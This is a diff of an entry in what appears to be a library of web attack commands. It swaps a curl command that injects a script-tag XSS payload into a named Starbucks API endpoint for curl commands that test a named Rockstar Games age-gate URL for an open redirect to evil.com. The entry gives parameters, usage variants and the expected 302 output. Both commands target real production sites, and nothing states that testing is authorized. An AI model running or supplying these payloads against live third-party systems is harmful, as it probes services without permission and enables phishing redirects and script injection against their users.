@@ -1,12 +1,12 @@
 ---
+id: cmd-curl-test-open-redirect
 data: >-
-  curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d
-  "query=coffee" -d
-  "siteBaseUrl=http://googl.com/%0a<script>window.location='https://google.com';</script>"
-  --header "x-api-key: YOUR_API_KEY"
+  curl -L
+  "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://evil.com"
+  -v
 tags:
-  - open-redirect
-  - xss
+  - web-testing
+  - redirect
 type: command
 output: null
 executor: bash
@@ -14,9 +14,8 @@ platforms:
   - Linux
   - macOS
   - Windows
-id: be4d8b79-acb6-4e7c-904b-3b26fbc57ac5
-created_at: '2025-12-14T03:46:31.588Z'
-updated_at: '2025-12-14T03:46:31.588Z'
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:24:35.659Z'
 verified: false
 validated: true
 submitted: true
@@ -26,33 +25,39 @@ submitted: true
 ## Command
 
 ```bash
-curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<script>window.location='https://google.com';</script>" --header "x-api-key: YOUR_API_KEY"
+curl -L "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://evil.com" -v
 ```
 
 ## Description
 
-Tests open redirect by injecting a script to change location. Load response in browser to observe redirect.
+This command tests for an open redirect vulnerability by sending a GET request to the target endpoint with a malicious redirect parameter and following the location header to confirm redirection to an external site.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-d "siteBaseUrl=...` | Payload with script redirect | Yes |
+| `-L` | Follow redirects | Yes |
+| `-v` | Verbose output to show headers | Yes |
+| `?next=http://evil.com` | Malicious redirect URL in query | Yes |
 
 ## Examples
 
 ### Basic Usage
 
-As above.
+```bash
+curl -L "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://evil.com" -v
+```
 
 ### Advanced Usage
 
-Change 'https://google.com' to custom URL.
+```bash
+curl -L -H "User-Agent: Mozilla/5.0" "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://evil.com/test" -v
+```
 
 ## Expected Output
 
-HTML with script; browser redirects to target.
+Verbose output showing HTTP/1.1 302 Found and Location: http://evil.com in the response headers, confirming the redirect.
 
 ## Related
 
-- [[Related Procedure: Perform Open Redirect using siteBaseUrl Injection]]
+- [[Related Procedure|procedures/Exploit-Open-Redirect-in-Age-Gate]]
